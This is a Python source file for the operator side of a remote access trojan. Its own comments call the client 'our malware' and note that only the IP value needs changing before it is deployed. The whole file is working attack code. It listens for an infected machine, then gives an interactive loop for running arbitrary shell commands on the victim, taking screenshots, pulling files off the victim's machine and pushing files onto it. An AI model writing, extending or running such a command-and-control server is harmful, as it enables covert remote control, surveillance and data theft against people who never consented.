from socket import socket, AF_INET, SOCK_STREAM
from base64 import b64decode, b64encode
import os

s = socket(AF_INET, SOCK_STREAM) # Creates fresh IPv4 socket 

s.bind(("127.0.0.1", 1234)) # Port 1234 
# So we set up to listen on our specific port and IP
# Can be changed for real use. Only value needing changing in order to be deployed. Using loopback/localhost for test
s.listen()
print("[*]Listening for incoming connections...")

conn, addr = s.accept()
print(f"[*]Recieved connection from {addr[0]}:{addr[1]}") # Recieved connection
# Prints the clients IP and port they connected from 

while True:
    inp = input("$ ") # Gets the command input  and stores in inp; the $ is just for cosmetics
    cmd = inp + '\n' # New line so our malware knows where to stop reading
    
    if inp.lower() in ('q', 'quit'):
        conn.send(cmd.encode()) # Any data sent over network must be in bytes format 
        resp = conn.recv(1024).decode() # 1024 buffer bytes for receiving the data
        print(resp)
        exit(0) 
        # Send command to client and recieve the response 
    
    elif inp.lower() == "screenshot":
        conn.send(cmd.encode()) # Get b64 of the screenshot 
        b64_string = ''
        
        while True: 
            tmp = conn.recv(32768).decode() # Number of bytes we want to read at a time 
            # Raw binary that we can use later to decode the base64 string into an actual image
            b64_string += tmp # Build our b64 string
            
            if len(tmp) < 32768: # Less than the number we should be reading
                break
        # This loop continues until we get a capture all the contents 
        # Once it is less than 32768 bytes we end the loop to signal the end of the image/file we are capturing
        
        with open('screenshot.png', 'wb') as f: 
            f.write(b64decode(b64_string))
            # Write raw binary data into screenshot.png
        
        print("Screenshot saved successfully.")
        
    
    elif inp.split(' ')[0].lower() == "download":
        conn.send(cmd.encode())
        b64_string = ''
        while True: 
            tmp = conn.recv(32768).decode()
            b64_string += tmp
            if len(tmp) < 32768: # Sees no more data to read 
                break
            
        if "not found" in b64_string: 
            print(b64_string)
            continue 
            # Return back to take another set of input
            
        file_name, b64_string = b64_string.split(':') # Gets the encoded raw binary from the file download command
        with open(file_name, 'wb') as f:
            f.write(b64decode(b64_string))
        print("File saved successfully.")
        
    
    elif inp.split(' ')[0].lower() == "upload":
        file_name = inp.split(' ')[1].strip()
        if not os.path.exists(file_name):
            print("File does not exist on this machine.")
        else:
            file_content = ''
            with open(file_name, 'rb') as f: # wb 'write binary' , rb 'read binary'
                file_content = b64encode(f.read())
            tmp = ":".join([file_name, str(file_content)]) + '\n'
            conn.send(tmp.encode())
            
            resp = conn.recv(1024).decode() # Telling if it was successfully uploaded
            
    # Shell commands, etc
    else: 
         conn.send(cmd.encode())
         resp = conn.recv(32768).decode() # Needs many bytes due to large list of shell commands available and their output
         print(resp) # Gives us back what we want to see from the shell command on clients computer